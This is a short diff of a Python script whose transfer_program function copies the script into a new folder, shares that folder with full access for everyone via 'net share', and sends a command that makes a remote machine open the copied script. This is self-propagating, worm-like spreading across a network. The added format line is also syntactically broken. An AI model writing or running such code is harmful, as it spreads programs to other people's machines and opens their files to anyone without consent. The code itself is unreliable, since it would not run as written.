@@ -367,11 +367,19 @@ def get_IP_prefix(ip_address):
 
 
 def transfer_program():
-    shutil.copyfile
     current_path = os.path.realpath(__file__)
+    share_folder = r"E:\小小私聊"
+    local_cmd = "net share Docs={} /grant:everyone,FULL",format=share_folder
+    try:
+        os.mkdir(share_folder)
+        shutil.copy(current_path, share_folder)
+        os.popen(local_cmd)
+    except:
+        print("[ - ] error in transfer program")
+        pass
 
 
-    local_cmd = r"net share Docs=E:\Documents /grant:everyone,FULL"
+   
     remote_cmd = "explorer \\\\ " +getIP()+r"\share\toWho.py"
     send_cmd(remote_cmd)
 
